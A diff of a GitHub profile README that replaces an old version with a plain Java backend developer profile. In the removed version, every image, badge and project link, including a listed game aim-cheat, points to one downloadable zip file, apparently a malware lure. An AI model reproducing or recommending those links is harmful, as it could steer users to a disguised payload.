@@ -1,67 +1,67 @@
-<!-- GitHub Profile README -->
-<h1 align="center">Hi 👋, I'm Nikhil</h1>
-<h3 align="center">A passionate learner and aspiring web developer 👨‍💻</h3>
+👋 Hi, I'm Nikhil
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip+Code&size=24&duration=2000&pause=1000&color=00FF99&center=true&width=440&lines=Self-Taught+Programmer;Front-End+Enthusiast;Building+cool+projects+%F0%9F%92%BB" alt="Typing SVG" />
-</p>
+💻 Java Backend Developer | Full Stack Learner
+🚀 Passionate about building web applications using modern Java technologies.
 
----
+🚀 About Me
 
-### 🌐 Connect with me:
-<p align="left">
-  <a href="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" target="_blank">
-    <img align="center" src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-  </a>
-</p>
+🌱 Currently learning Spring Boot and Backend Development
 
----
+💻 Practicing Data Structures and Algorithms in Java
 
-### 💻 Technologies I Use:
-<p align="left">
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-</p>
+🧠 Interested in Full Stack Development
 
----
+🎯 Goal: Become a Professional Java Backend Developer
 
-### 🔥 GitHub Stats:
+🛠️ Tech Stack
+💻 Programming Languages
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" width="48%" />
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" width="48%" />
-</p>
+Java
 
----
+🌐 Frontend Technologies
 
-### 📁 Featured Projects
+HTML
 
-Here are a few cool projects from my profile:
+CSS
 
-- 🎯 **[Delta Force Aim Enhancer](https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip)** — Cheats & hacks for better aim (educational/hobby project).
-- 🌐 **[My GitHub Pages Site](https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip)** — Personal website made with HTML & CSS.
-- 📄 **[MySecondDoc](https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip)** — Possibly docs or early project experiments.
+JavaScript
 
----
+React.js
 
-### 📈 Most Used Languages
+⚙️ Backend Technologies
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" />
-</p>
+JDBC
 
----
+Hibernate
 
-### ⚡ Fun Fact:
-- I love building small projects to learn fast and break things to understand how they work ⚙️  
-- Currently exploring advanced JavaScript and modern web workflows 🚀
+Spring Framework
 
----
+Spring Boot
 
-<p align="center">
-  <img src="https://raw.githubusercontent.com/nikhildaharwal2004/About-me./main/sportswoman/Software_3.9.zip" alt="snake animation" />
-</p>
+🗄️ Database
 
+SQL
+
+MySQL
+
+🧰 Tools
+
+Git
+
+GitHub
+
+Eclipse IDE
+
+Spring Tool Suite (STS)
+
+📊 GitHub Stats
+
+🔥 Top Languages
+
+📫 Connect With Me
+
+GitHub: https://github.com/nikhildaharwal2004
+
+LinkedIn: Add your LinkedIn profile
+
+⭐ Always learning and building projects with Java & Spring Boot.
